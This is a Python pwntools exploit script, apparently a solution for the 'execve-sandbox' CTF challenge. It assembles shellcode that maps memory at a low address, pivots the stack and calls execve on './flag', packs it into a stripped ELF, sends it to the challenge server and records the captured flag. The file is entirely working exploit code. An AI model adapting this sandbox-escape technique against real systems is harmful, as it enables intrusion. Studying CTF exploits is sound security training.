#!/usr/bin/env python2

from pwn import *

def exploit():

  code = ""
  code += shellcraft.echo("hello\n")
  code += shellcraft.syscall('SYS_mmap', 0x11000, 0x1000, 7, 0x122, 0, 0)
  code += "mov rsp, 0x11000\n"
  code += shellcraft.pushstr("./flag")
  code += shellcraft.memcpy(0x10000, 'rsp', 6)
  code += shellcraft.syscall('SYS_execve', 0x10000, 0, 0)

  elf = make_elf(asm(code), extract=True, strip=True )
  print "len", hex(len(elf))

  payload = elf.ljust(0x1000, "\x00")
  print p.sendafter("binary...", payload)

  p.interactive()

  # CTF{Time_to_read_that_underrated_Large_Memory_Management_Vulnerabilities_paper}

if __name__ == "__main__":
  name = "./execve-sandbox"
  binary = ELF(name)

  context.terminal=["tmux", "sp", "-h"]
  context.arch = "amd64"
  context.os = "linux"

  if len(sys.argv) > 1:
    p = remote("execve-sandbox.ctfcompetition.com", 1337)
  else:
    p = process(name, cwd="./sandbox", env={})

    gdb.attach(p, """
      set follow-fork-mode child
    c
    """)

  exploit()
